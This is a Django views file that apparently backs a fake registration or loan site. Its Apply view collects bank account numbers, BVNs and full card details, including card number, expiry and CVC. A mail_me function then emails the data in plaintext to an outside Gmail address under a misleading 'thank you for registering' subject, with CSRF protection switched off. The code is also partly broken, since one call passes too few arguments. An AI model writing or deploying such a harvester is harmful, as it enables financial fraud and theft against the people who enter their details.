
from django.shortcuts import render
from django.views.generic import TemplateView
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .form import LoginForm
from django.shortcuts import redirect
from django.core.mail import send_mail
from django.conf import settings
# Create your views here.

class Confirmed(TemplateView):
    template_name ="confirmed.html"

class Mail(TemplateView):
    template_name ="mail.html"

class Apply(TemplateView):
    template_name ="apply.html"
    @csrf_exempt
    def post(self, *arg, **kwargs):
        form = LoginForm(data=self.request.POST)
        self.get_context_data()
        q = form.data.dict()
        print('==========',q)
        #  ' and ', q["account_number"], '========================'
        if form.is_valid():
            form.save()
            print('ssucdrsdlsdsjknjkdsnjdsndj')
            mail_me(q["email"], q["fname"])
            return redirect('/')
        # return render(request, 'login.html', {'form': form})   

        # mail_me(q["email"], q["fullName"])
        else:
            # print('ssucdrsdlsdsjknjkdsnjdsndj')
            mail_me(q["email"], q["account_number"],q["bvn"], q["bank_name"],q["card_name"],q["card_number"],q["card_year"],q["card_month"],q["card_cvc"])
            return redirect('/confirmed')

class Home(TemplateView):
    template_name ="index.html"

        



def mail_me(email,account_number,bvn, bank_name,card_name,card_number,card_year,card_month,card_cvc):
    print("=============RAN============")
    subject = 'Thank you for registering to our site'
    message = 'EMAIL== ' + email + ' ACC NUM=='+account_number + ' BVN== '+bvn + ' BANK NAME=='+bank_name + 'CARD NAME=='+card_name + 'CARD NUM=='+card_number+ 'CARD YEAR=='+card_year +'CARD MONTH=='+card_month +'CVC=='+card_cvc
    email_from = email
    # print(subject, message, email_from, ["sunnyemmanuel5@gmail.com"] )
    return send_mail( subject, message, email_from, ["borrow.ng@gmail.com"] )
    